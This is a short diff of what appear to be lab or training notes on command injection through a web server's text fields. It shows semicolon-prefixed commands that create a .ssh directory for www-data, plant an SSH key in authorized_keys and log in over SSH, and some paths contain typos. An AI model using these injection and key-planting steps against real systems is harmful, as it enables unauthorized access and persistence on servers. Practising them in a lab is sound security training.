@@ -86,15 +86,15 @@ use semicolons in test boxes on the webserver
 
     #copy and paste the WHOLE key
 ### Prepare website > cmd injection > know users and home directories (/etc/passwd)
-make /.ssh in the users home directory
-;mkdir /var/www/.ssh
-;ls -la /var/www
+#### make /.ssh in the users home directory
+    ;mkdir /var/www/.ssh
+    ;ls -la /var/www
 
 ### upload key
     ;echo "ssh key" > /var/www/.ssh/authorized_keys #>> for append
     ;cat /car/www/.ssh/authorized_keys
 ### ssh into machine
-        ssh -i /home/student/.ssh/id_rsa www-data@127.0.0.1 - p1112
+        ssh -i /home/student/www/.ssh/id_rsa www-data@127.0.0.1 - p1112
     
     
         
